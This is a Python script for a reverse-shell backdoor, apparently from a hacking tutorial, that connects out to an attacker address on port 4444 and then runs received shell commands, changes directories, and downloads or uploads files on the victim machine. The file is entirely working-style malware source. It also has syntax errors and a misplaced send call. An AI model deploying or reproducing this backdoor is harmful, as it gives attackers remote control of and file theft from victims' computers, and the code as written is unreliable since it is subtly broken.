#!/usr/bin/env python3

import socket # to establish connection
import subprocess, os
import json # for serialization
import base64

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create TCP connection with victim
		self.connection.connect((ip, port)) # IP and port of attacker

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data += self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue		

	def execute_command(self, command):
		return subprocess.check_output(command, shell=True)

	def change_working_directory(self, path):
		os.chdir(path)
		return "[+] changing working directory to " + path)

	def read_file(self, path):
		with open(path, "rb") as file: # treat file as read + binary
			return base64.b64encode(file.read())
      
  def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] upload successful!"

  def run(self): 
		while True:
			command = self.reliable_receive()
			try:
				if command[0] == "exit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result = self.execute_command(command)

			except Exception:
				command_result = "[-] error during command execution :("self.reliable_send(command_result)

my_backdoor = Backdoor("10.0.2.16", 4444) # IP and port of attacker
my_backdoor.run()
